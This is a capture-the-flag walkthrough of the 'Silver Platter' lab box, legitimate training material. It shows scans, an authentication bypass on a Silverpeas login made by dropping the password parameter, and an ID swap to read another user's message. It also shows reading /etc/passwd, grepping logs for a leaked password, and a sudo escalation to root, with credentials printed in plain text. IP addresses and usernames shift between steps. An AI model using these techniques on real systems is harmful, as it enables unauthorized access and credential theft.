# Silver Platter
Can you breach the server? 
## Difficulty: Easy
Think you've got what it takes to outsmart the Hack Smarter Security team? They claim to be unbeatable, and now it's your chance to prove them wrong. Dive into their web server, find the hidden flags, and show the world your elite hacking skills. Good luck, and may the best hacker win!

But beware, this won't be a walk in the digital park. Hack Smarter Security has fortified the server against common attacks and their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist - that's how 'cool' they are). The hacking gauntlet has been thrown, and it's time to elevate your game. Remember, only the most ingenious will rise to the top. 

May your code be swift, your exploits flawless, and victory yours!

#### Make sure you wait a full 5 minutes after you start the machine before scanning or doing any enumeration. This will make sure all the services have started.

## Information Gathering
```bash
nmap -sC -sV 10.201.48.47 -oN nmap_silverplatter

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 20:35 WIB
Nmap scan report for http://10.201.48.47
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d1:7d:1c:13:cb:38:70:8b:a8:a3:aa:68:37:05:d7:62 (ECDSA)
|_  256 73:6b:45:1b:c0:de:81:a2:14:33:2a:b5:14:7f:dd:c5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.08 seconds

```
## Enumerations
+ In http://10.201.48.47#contact we found username is `scr1ptkiddy`
+ Using gobuster found
```bash
/assets            
/images 
/index.html
```
```bash
gobuster dir -u http://10.201.74.14:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

/website              
/console              
```

In url browser search `http://10.201.17.48:8080/silverpeas/AuthenticationServlet`

Get the Login Page

Next using burpsuite and remove the password like this
```
POST /silverpeas/AuthenticationServlet HTTP/2
Host: 212.129.58.88
Content-Length: 28
Origin: https://212.129.58.88
Content-Type: application/x-www-form-urlencoded

Login=scriptkiddy&DomainId=0
```

Next check notification in page and let's go `10.201.17.48:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5`

Change number `5` in end to `6` like this `http://10.201.17.48:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6`

Congrast you get credentials to ssh
```bash
Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 

Username: tim

Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```
## Exploit
```bash
ssh tim@10.201.17.48
The authenticity of host '10.201.17.48 (10.201.17.48)' can't be established.
ED25519 key fingerprint is SHA256:hY5jvHqhQA0e7k0GKNCJYtPcWhrWjGRF+V3LWjjiZUs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.201.17.48' (ED25519) to the list of known hosts.
tim@10.201.17.48's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 24 12:14:27 PM UTC 2025

  System load:  0.080078125        Processes:                127
  Usage of /:   60.9% of 12.94GB   Users logged in:          0
  Memory usage: 55%                IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                 IPv4 address for ens5:    10.201.17.48

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

261 updates can be applied immediately.
180 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Dec 13 16:33:12 2023 from 192.168.1.20
tim@ip-10-201-17-48:~$ ls -la
total 12
dr-xr-xr-x 2 root root 4096 Dec 13  2023 .
drwxr-xr-x 6 root root 4096 Jul 21 20:10 ..
-rw-r--r-- 1 root root   38 Dec 13  2023 user.txt

```
`Yeyy we get user.txt`

Next
```bash
tim@ip-10-201-17-48:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
tyler:x:1000:1000:root:/home/tyler:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
tim:x:1001:1001::/home/tim:/bin/bash
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
ssm-user:x:1002:1002::/home/ssm-user:/bin/sh
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
```
`
grep -iR "password" /var/log
`
```bash
tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -
```
Password for tyler `_Zd_zx7N823/`
```bash
tim@ip-10-201-17-48:/var/log$ su tyler
Password: 
tyler@ip-10-201-17-48:/var/log$ 
```
```bash
tyler@ip-10-201-17-48:/var/log$ sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on ip-10-201-17-48:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on ip-10-201-17-48:
    (ALL : ALL) ALL
```
```bash
root@ip-10-201-17-48:/var/log# cd /root
root@ip-10-201-17-48:~# ls -la
total 52
drwx------  6 root root 4096 Jul 20 17:14 .
drwxr-xr-x 19 root root 4096 Sep 24 11:53 ..
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Jul 20 17:07 .cache
-rw-------  1 root root   20 Jul 20 17:06 .lesshst
drwxr-xr-x  3 root root 4096 Dec 13  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   38 Dec 13  2023 root.txt
-rw-r--r--  1 root root   66 Dec 13  2023 .selected_editor
drwx------  3 root root 4096 Dec 12  2023 snap
drwx------  2 root root 4096 Jul 20 17:06 .ssh
-rwxr-xr-x  1 root root   97 Dec 13  2023 start_docker_containers.sh
-rw-r--r--  1 root root    0 Dec 13  2023 .sudo_as_admin_successful
-rw-------  1 root root 1309 Jul 20 17:14 .viminfo
```
```bash
root@ip-10-201-17-48:~# cat root.txt
THM{********************}
```
`Finnaly!!`